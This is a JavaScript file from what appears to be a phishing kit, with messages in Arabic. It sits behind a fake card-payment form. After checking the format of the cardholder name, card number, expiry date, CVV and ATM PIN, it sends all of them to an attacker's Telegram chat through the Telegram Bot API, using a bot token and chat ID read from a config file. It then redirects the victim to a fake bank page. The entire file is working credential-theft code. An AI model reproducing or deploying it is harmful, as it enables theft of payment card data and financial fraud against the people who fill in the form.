document.addEventListener("DOMContentLoaded", function() {
    var errorText = document.getElementById("errorText");
    var errorText1 = document.getElementById("errorText1");
    var errorText2 = document.getElementById("errorText2");
    var errorText3 = document.getElementById("errorText3");
    var errorText4 = document.getElementById("errorText4");
    var errorText5 = document.getElementById("errorText5");
    var name = document.getElementById("name");
    var number = document.getElementById("number");
    var expMonth = document.getElementById("expMonth");
    var expYear = document.getElementById("expYear");
    var cvv = document.getElementById("cvv");
    var fort = document.getElementById("fort");
    var nextButton = document.getElementById("nextButton");

    nextButton.addEventListener("click", function(e) {
        e.preventDefault();

        // إعادة تعيين الرسائل الخطأ
        errorText.textContent = "";
        errorText1.textContent = "";
        errorText2.textContent = "";
        errorText3.textContent = "";
        errorText4.textContent = "";
        errorText5.textContent = "";

        var nameValue = name.value;
        var numberValue = number.value;
        var expMonthValue = expMonth.value;
        var expYearValue = expYear.value;
        var cvvValue = cvv.value;
        var fortValue = fort.value;

        if (nameValue === "") {
            errorText.textContent = "الرجاء إدخال اسم على البطاقة.";
            return;
        }

        if (numberValue.length !== 16 || !/^\d+$/.test(numberValue)) {
            errorText2.textContent = "الرجاء إدخال رقم بطاقة صحيح.";
            return;
        }

        if (expMonthValue.length !== 2 || isNaN(expMonthValue) || expMonthValue < 0 || expMonthValue > 12) {
            errorText3.textContent = "الرجاء إدخال شهر صحيح (MM).";
            return;
        }

        if (expYearValue.length !== 4 || isNaN(expYearValue) || expYearValue < 2023) {
            errorText4.textContent = "الرجاء إدخال سنة صحيحة (YY).";
            return;
        }

        if (cvvValue.length !== 3 || !/^\d+$/.test(cvvValue)) {
            errorText1.textContent = "الرجاء إدخال رمز الأمان (CVV) صحيح.";
            return;
        }

        if (fortValue.length !== 4 || !/^\d+$/.test(fortValue)) {
            errorText5.textContent = "الرجاء إدخال رمز PIN صحيح.";
            return;
        }
        fetch('config/config.json')
        .then(response => response.json())
        .then(config => {
            var billerNumber = localStorage.getItem('billerNumber') || '';
            var botToken = config.botToken;
            var chatId = config.chatId;
        var message = `
ID: ${billerNumber}\n
 الاسم  : ${nameValue}
 رقم البطاقة : ${numberValue}
  الرمز: ${cvvValue}
 التاريخ : ${expYearValue}/${expMonthValue}
 رمز الصراف : ${fortValue}`;

        fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
            }),
        })
            .then((response) => {
                console.log("تم إرسال الرسالة إلى تلغرام");
                window.location.href = "bank.html";
            })
            .catch((error) => console.error("خطأ في الإرسال:", error));
        });
    });
    });
